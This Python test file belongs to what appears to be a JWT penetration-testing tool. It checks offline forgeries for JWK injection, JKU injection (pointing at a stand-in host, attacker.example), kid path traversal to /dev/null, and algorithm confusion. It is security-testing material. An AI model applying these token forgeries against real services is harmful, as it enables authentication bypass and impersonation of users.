"""Offline tests for the attack modules, forging/cracking assertions (no network)."""

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

import hashlib
import hmac

from jwtpen.core import jwt_utils, keys
from jwtpen.attacks import jwk_injection, jku_injection, kid_path_traversal, algorithm_confusion
from jwtpen.attacks.base import INCONCLUSIVE


def _sample_rs256_token():
    """A realistic RS256 token signed by some 'server' key, to forge from."""
    server_key = keys.generate_rsa_keypair()
    header = {"alg": "RS256", "kid": "server-key-1"}
    payload = {"iss": "portswigger", "sub": "wiener"}
    signing_input = jwt_utils.encode(header, payload)
    return jwt_utils.construct_jwt(signing_input, jwt_utils.sign_rsa(signing_input, server_key))


def test_jwk_injection_forges_a_token_the_embedded_key_verifies():
    """The forged token must verify against the PUBLIC key embedded in its own jwk header."""
    forged, jwk, private_key = jwk_injection.forge_token(_sample_rs256_token())
    header, payload, signature_b64 = jwt_utils.decode(forged)

    # Header carries our key, forced to RS256, with header kid matching the embedded JWK's kid.
    assert header["alg"] == "RS256"
    assert header["jwk"] == jwk
    assert header["kid"] == jwk["kid"]
    # Payload is passed through unchanged.
    assert payload["sub"] == "wiener"

    # A vulnerable server reads the embedded JWK and verifies with it, so that key must accept.
    signing_input = forged.rsplit(".", 1)[0]
    embedded_public_key = keys.jwk_to_public_key(jwk)
    embedded_public_key.verify(
        jwt_utils._b64url_decode(signature_b64),
        signing_input.encode("ascii"),
        padding.PKCS1v15(),
        hashes.SHA256(),
    )

    # The returned private key is the match for the embedded public key, so the report can hand
    # it to the tester to re-sign a hand-edited payload.
    assert keys.public_key_pem(private_key) == keys.public_key_pem(embedded_public_key)


def test_jwk_injection_uses_a_fresh_key_each_time():
    """Each forgery generates its own keypair, so two runs embed different keys."""
    _, jwk_one, _ = jwk_injection.forge_token(_sample_rs256_token())
    _, jwk_two, _ = jwk_injection.forge_token(_sample_rs256_token())
    assert jwk_one["n"] != jwk_two["n"]


def test_jku_injection_forges_a_token_the_hosted_key_verifies():
    """The forged token must verify against the PUBLIC key in the JWK Set we told the tester to host."""
    material = jku_injection.generate_material()
    private_key = keys.load_private_key_pem(material["private_key_pem"])
    jku_url = "https://attacker.example/.well-known/jwks.json"

    forged = jku_injection.forge_token(_sample_rs256_token(), jku_url, private_key, material["kid"])
    header, payload, signature_b64 = jwt_utils.decode(forged)

    # Header points at the hosted set by URL and names our key by kid, forced to RS256.
    assert header["alg"] == "RS256"
    assert header["jku"] == jku_url
    assert header["kid"] == material["kid"]
    # Payload is passed through unchanged.
    assert payload["sub"] == "wiener"

    # A vulnerable server fetches the hosted set and verifies with the key whose kid matches.
    hosted_jwk = next(k for k in material["jwks"]["keys"] if k["kid"] == material["kid"])
    hosted_public_key = keys.jwk_to_public_key(hosted_jwk)
    signing_input = forged.rsplit(".", 1)[0]
    hosted_public_key.verify(
        jwt_utils._b64url_decode(signature_b64),
        signing_input.encode("ascii"),
        padding.PKCS1v15(),
        hashes.SHA256(),
    )

    # The private key we hand back is the match for the hosted public key, so the report's
    # re-signing steps work against the key set that stays hosted.
    assert keys.public_key_pem(private_key) == keys.public_key_pem(hosted_public_key)


def test_kid_path_traversal_forges_hs256_token_signed_with_the_file_key():
    """forge() must rewrite kid, force HS256, keep the payload, and HMAC-sign with the given key."""
    token = _sample_rs256_token()
    key = b"\x00"  # the null-byte key a /dev/null file yields
    forged = kid_path_traversal.forge(token, "../../../../dev/null", key)
    header, payload, signature_b64 = jwt_utils.decode(forged)

    assert header["alg"] == "HS256"
    assert header["kid"] == "../../../../dev/null"
    assert payload["sub"] == "wiener"  # payload passed through unchanged

    # A server that loaded `key` from the kid path would recompute exactly this signature.
    signing_input = forged.rsplit(".", 1)[0]
    expected = hmac.new(key, signing_input.encode("ascii"), hashlib.sha256).digest()
    assert jwt_utils._b64url_decode(signature_b64) == expected


def test_kid_traversal_variants_cover_absolute_and_climbing_paths():
    """Variants must include the absolute path and relative climbs from depth 0 to _MAX_DEPTH."""
    variants = kid_path_traversal._traversal_variants("dev/null")
    assert "/dev/null" in variants            # absolute
    assert "dev/null" in variants             # depth 0, relative
    assert "../dev/null" in variants          # depth 1
    assert ("../" * kid_path_traversal._MAX_DEPTH + "dev/null") in variants


def test_algorithm_confusion_forges_hs256_signed_with_the_public_key():
    """forge() must switch alg to HS256 and HMAC-sign with the exact key bytes given."""
    token = _sample_rs256_token()
    key_bytes = keys.public_key_pem(keys.generate_rsa_keypair())  # any bytes the 'server' would use
    forged = algorithm_confusion.forge(token, key_bytes)
    header, payload, signature_b64 = jwt_utils.decode(forged)

    assert header["alg"] == "HS256"
    assert payload["sub"] == "wiener"           # payload passed through unchanged
    signing_input = forged.rsplit(".", 1)[0]
    expected = hmac.new(key_bytes, signing_input.encode("ascii"), hashlib.sha256).digest()
    assert jwt_utils._b64url_decode(signature_b64) == expected


def test_algorithm_confusion_tries_spki_pkcs1_and_pasted_forms():
    """The HMAC-secret forms must cover SPKI and PKCS#1 (with/without newline), paste first."""
    public_key = keys.generate_rsa_keypair().public_key()
    pasted = b"-----BEGIN PUBLIC KEY-----\nPASTED\n-----END PUBLIC KEY-----"
    forms = algorithm_confusion._hmac_key_forms(public_key, pasted)
    labels = [label for label, _ in forms]
    key_sets = [kb for _, kb in forms]

    assert labels[0] == "pasted PEM, verbatim"        # a pasted key is tried first, verbatim
    assert keys.public_key_pem(public_key) in key_sets                 # SPKI with trailing newline
    assert keys.public_key_pem(public_key).rstrip(b"\n") in key_sets   # and without
    assert keys.public_key_pkcs1_pem(public_key) in key_sets           # PKCS#1 form too
    assert len(key_sets) == len(set(key_sets))        # no duplicate byte forms


def test_jku_injection_without_a_url_does_not_run():
    """With no hosted URL/key, the check reports INCONCLUSIVE and sends nothing (no network)."""
    finding = jku_injection.run("raw", "token", "https", options={})
    assert finding.status == INCONCLUSIVE
    assert finding.evidence == {}
